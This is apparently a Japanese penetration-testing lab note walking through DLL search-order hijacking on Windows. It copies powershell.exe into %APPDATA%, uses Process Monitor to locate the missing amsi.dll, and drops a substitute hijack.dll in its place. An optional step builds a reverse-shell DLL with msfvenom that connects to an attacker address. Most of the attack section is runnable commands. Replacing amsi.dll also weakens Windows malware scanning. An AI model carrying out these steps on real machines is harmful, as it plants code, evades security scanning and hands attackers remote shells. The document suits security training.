### DLL search Order hijack

* DLLを探す順番

  •実行されたアプリケーションのディレクトリ
  •システムディレクトリ（C:¥Windows¥System32
  •16bit システムディレクトリ（ C:¥Windows¥System
  •Windowsディレクトリ
  •カレントディレクトリ
  •PATH環境変数で定義されたディレクトリ
  •コマンドプロンプトで、`echo %PATH%`

同名のDLLを前のディレクトリにおいて、ハイジャックする。

□ ％APPDATA％

![image-20220830145956912](img/DLLsearchOrderHijack/image-20220830145956912.png)

* powershell.exeをコピーする

  ```
  copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe %APPDATA%\powershell.exe
  ```

  ![image-20220830150112677](img/DLLsearchOrderHijack/image-20220830150112677.png)

* プロセスモニターを起動する

  ```
  C:\Users\Administrator.EC2AMAZ-QSCU18V\AppData\Roaming>C:\Users\Administrator.EC2AMAZ-QSCU18V\Desktop\Tools\SysinternalsSuite\Procmon.exe
  ```

  ※procmonで「not found」となっている.dllを探す

* powershell.exeのプロセスを探し、amsi.dllの実行状況を見る

  ```
  %APPDATA%\powershell.exe
  ```

  フィルターアイコンを押下

  Process Name is powershell.exe

  Path contains amsi.dll

  を「Add」してApplyを押下すると検索条件が絞られる

  ![image-20220830151028802](img/DLLsearchOrderHijack/image-20220830151028802.png)

  ![image-20220830151136440](img/DLLsearchOrderHijack/image-20220830151136440.png)

* amsi.dllをカレントディレクトリに配置する

  ```
   copy C:\Windows\System32\amsi.dll .\Roaming\am
  si.dll
  ```

* powershell.exeを再度実行しプロセスモニタリングする

  ![image-20220830151535489](img/DLLsearchOrderHijack/image-20220830151535489.png)

* amsi.dllの中身をhijack.dllの中身で置き換える

  ```
  copy %USERPROFILE%\Desktop\Penetration\hijack.dll %APPDATA%\amsi.dll
  ```

  ![image-20220830151905843](img/DLLsearchOrderHijack/image-20220830151905843.png)

  ずっとpsのままだとcopyできないので注意

  ![image-20220830151946691](img/DLLsearchOrderHijack/image-20220830151946691.png)

  

□ 時間が余ったらmsfvenomで作成したリバースシェルを用いてamsi.dllを作成する。

* msfvenomでリバースシェルを作成する

  ```bash
  msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=192.168.11.156 LPORT=1234 -f dll > amsi.dll
  ```

  ![image-20220830153049867](img/DLLsearchOrderHijack/image-20220830153049867.png)

□後ほど置き換えてリバースシェルを張る